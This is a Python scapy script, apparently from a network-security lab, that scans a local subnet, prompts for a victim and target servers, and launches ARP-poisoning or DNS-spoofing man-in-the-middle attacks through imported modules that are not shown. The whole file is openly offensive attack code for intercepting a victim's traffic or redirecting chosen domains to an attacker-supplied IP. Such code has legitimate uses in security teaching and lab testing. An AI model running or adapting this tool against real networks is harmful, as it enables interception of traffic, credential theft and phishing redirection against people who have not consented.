import sys
from scapy.all import *
import arpForward
import dnsSpoofing

def main():
    networkInterface = "enp0s3"
    victimIP = []
    spoofIP = []
    urlList = {}
    devicesListOnNetwork = {}
    start = False

    modeOfAttack = sys.argv[1]

    print("Scanning the network .. ")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"), timeout=2, iface=networkInterface,
                     inter=0.1)
    for arg1, arg2 in ans:
        devicesListOnNetwork.update({arg2[ARP].psrc : arg2[ARP].hwsrc})
        print("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))

    input = ""
    while input not in devicesListOnNetwork.keys():
        input = raw_input("Select victim IP from the network (e.g. 192.168.56.101) :")
        if input in devicesListOnNetwork.keys():
            victimIP.append(input)

    input =""
    while input != "no":
        if modeOfAttack == "arp":
            input = raw_input("Select server (e.g 192.168.56.102) :")
        elif modeOfAttack == "dns":
            input = raw_input("Select server (e.g 192.168.56.104) :")
        else:
            input = raw_input("Select server: ")

        if input in devicesListOnNetwork.keys():
            spoofIP.append(input)
            input = raw_input("Add more server IP or no : ")
        else :
           print("No IP on network")


    if modeOfAttack == "arp":
        start = True
        arpAttack = arpForward.Arp(networkInterface, victimIP, spoofIP)
        print("ARP frowarding started...")
        print("Press ctrl+c and enter to stop")
        stop = "no"
        while(start):
            arpAttack.start()
            stop = raw_input("")
            if stop == "":
                start = False
    elif modeOfAttack == "dns":
        redirectTo = raw_input("Enter the ip where redirect victim requests:")
        while input != "stop":
            input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
            if input != "stop":
                input = input.upper()
                urlList.update({input + "   ": redirectTo})
                if input[0:4] != "WWW.":
                    urlList.update({"WWW." + input + "   ": redirectTo})
                else:
                    urlList.update({input[4:] + "   ": redirectTo})
        start = True
        dnsAttack = dnsSpoofing.Dns(networkInterface, victimIP[0],spoofIP, urlList)
        print("DNS spoof started...")
        print("Press ctrl+c and enter to stop")
        stop = "no"
        while (start):
            dnsAttack.start()
            stop = raw_input("")
            if stop == "":
                start = False
    else:
        print("Wrong mode of attack")
        sys.exit(1)




main()